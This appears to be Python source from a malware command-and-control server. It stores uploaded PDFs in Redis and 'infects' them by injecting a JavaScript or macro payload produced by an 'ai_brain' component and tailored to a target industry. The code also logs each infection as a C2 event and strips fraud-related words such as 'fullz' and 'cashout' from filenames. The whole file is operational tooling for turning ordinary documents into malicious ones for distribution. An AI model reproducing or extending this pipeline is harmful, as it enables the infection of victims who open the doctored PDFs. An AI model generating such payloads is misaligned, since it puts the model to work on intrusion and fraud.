def _sanitize_filename(name: str) -> str:
    """Clean up the filename — remove vendor prefixes, URL fragments, decode."""
    import re
    name = os.path.basename(name)
    # Remove known vendor/mirror prefix patterns
    name = re.sub(r'^(ilide\.info-|pdfcoffee[.-]com-|docdroid-|scribd-|download-|free-|fullz-)', '', name, flags=re.IGNORECASE)
    # Remove embedded hex hashes (32+ char hex strings often appended by PDF sites)
    name = re.sub(r'[_\.-][a-f0-9]{10,64}(_[a-f0-9]{10,64})*', '', name, flags=re.IGNORECASE)
    # Remove known junk words anywhere in the name
    for junk in ['ilide.info', 'pdfcoffee-com', 'pdfcoffee.com', 'pdf-free', 'pdf-free-', '-pdf-free',
                 'fullz-', '-fullz', 'loan-', '-cashout']:
        name = name.replace(junk, '')
    name = name.strip(' -_')
    # Collapse multiple hyphens and clean up edge artifacts
    name = re.sub(r'-{2,}', '-', name)
    name = re.sub(r'^-|-$', '', name)
    if not name or len(name) < 5:
        name = 'document.pdf'
    if not name.lower().endswith('.pdf'):
        if '.' in name:
            name = name.rsplit('.', 1)[0][:100] + '.pdf'
        else:
            name = name[:100] + '.pdf'
    return name


def _validate_pdf(file) -> bool:
    return file is not None and file.content_type == "application/pdf"


async def handle_upload(file: UploadFile) -> dict:
    if not _validate_pdf(file):
        return {"status": "error", "message": "Invalid PDF. Content-Type must be application/pdf"}

    pdf_id = await _next_id("pdf")
    raw_name = file.filename or "upload.pdf"
    clean_name = _sanitize_filename(raw_name)
    unique_filename = f"{pdf_id}_{clean_name}"
    filepath = os.path.join(PDF_BASE_DIR, unique_filename)

    try:
        content = await file.read()
        with open(filepath, "wb") as f:
            f.write(content)
    except Exception as e:
        return {"status": "error", "message": f"Failed to save PDF: {e}"}

    file_size = os.path.getsize(filepath)

    await c2_server.redis.set(
        f"c2:pdf:{pdf_id}",
        json.dumps({
            "filename": clean_name,
            "size": file_size,
            "filepath": filepath,
            "uploaded_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "infected": False,
        }),
    )

    return {
        "status": "uploaded",
        "pdf_id": pdf_id,
        "filename": clean_name,
        "size": file_size,
        "filepath": filepath,
    }


async def handle_infection(pdf_id: str, target_industry: str = None) -> dict:
    """Inject AI-generated payload into PDF using proper object model."""
    pdf_data_raw = await c2_server.redis.get(f"c2:pdf:{pdf_id}")
    if not pdf_data_raw:
        return {"status": "error", "message": f"PDF {pdf_id} not found"}

    pdf_data = json.loads(pdf_data_raw)
    source_path = pdf_data.get("filepath")

    if not source_path or not os.path.exists(source_path):
        return {"status": "error", "message": "Source PDF not found on disk"}

    try:
        from src.pdf_exploit.upgraded import UpgradedPDFInjection

        # Generate AI-driven payload for this target
        node_id = f"pdf_{pdf_id[:8]}"
        watermark = pdf_id[:8]
        payload_strategy = await ai_brain.process_payload_strategy(
            node_id=node_id,
            watermark=watermark,
            target_industry=target_industry,
        )
        js_payload = payload_strategy.get("js_payload", "")

        if not js_payload:
            # Fallback: read template directly
            async with aiofiles.open("pdfs/templates/macro.py", "r") as f:
                js_payload = await f.read()

        # Write AI-generated payload to a temp file for injection
        temp_macro = f"pdfs/templates/_generated_{pdf_id}.py"
        async with aiofiles.open(temp_macro, "w") as f:
            await f.write(js_payload)

        injector = UpgradedPDFInjection(
            template_path=source_path,
            output_path=INFECTED_PDF_DIR,
            macro_path=temp_macro,
        )

        # Generate clean infected filename: original_name_(i).pdf
        original_name = pdf_data.get("filename", "document.pdf")
        base = original_name.rsplit(".", 1)[0][:80]
        infected_name = f"{base}-(i).pdf"
        infected_path, _ = await injector.inject(custom_name=infected_name)

        # Clean up temp file
        try:
            os.remove(temp_macro)
        except Exception:
            pass

        pdf_data["infected"] = True
        pdf_data["infected_path"] = infected_path
        pdf_data["infected_at"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        pdf_data["target_industry"] = target_industry or "generic"
        await c2_server.redis.set(f"c2:pdf:{pdf_id}", json.dumps(pdf_data))

        await c2_server._push_event({
            "timestamp": pdf_data["infected_at"],
            "type": "ai_decision",
            "payload": {
                "action": "pdf_infected",
                "pdf_id": pdf_id,
                "target": target_industry or "generic",
            },
        })

        return {
            "status": "infected",
            "pdf_id": pdf_id,
            "filename": pdf_data["filename"],
            "size": pdf_data["size"],
            "infected_path": infected_path,
            "infected_at": pdf_data["infected_at"],
            "target_industry": target_industry or "generic",
            "payload_strategy": {
                "mutation_mode": payload_strategy.get("strategy", {}).get("mutation_mode"),
                "js_length": payload_strategy.get("strategy", {}).get("js_length"),
            },
        }
    except Exception as e:
        logger.error(f"[PDF] Infection error: {e}")
        return {"status": "error", "message": f"Failed to infect PDF: {e}"}


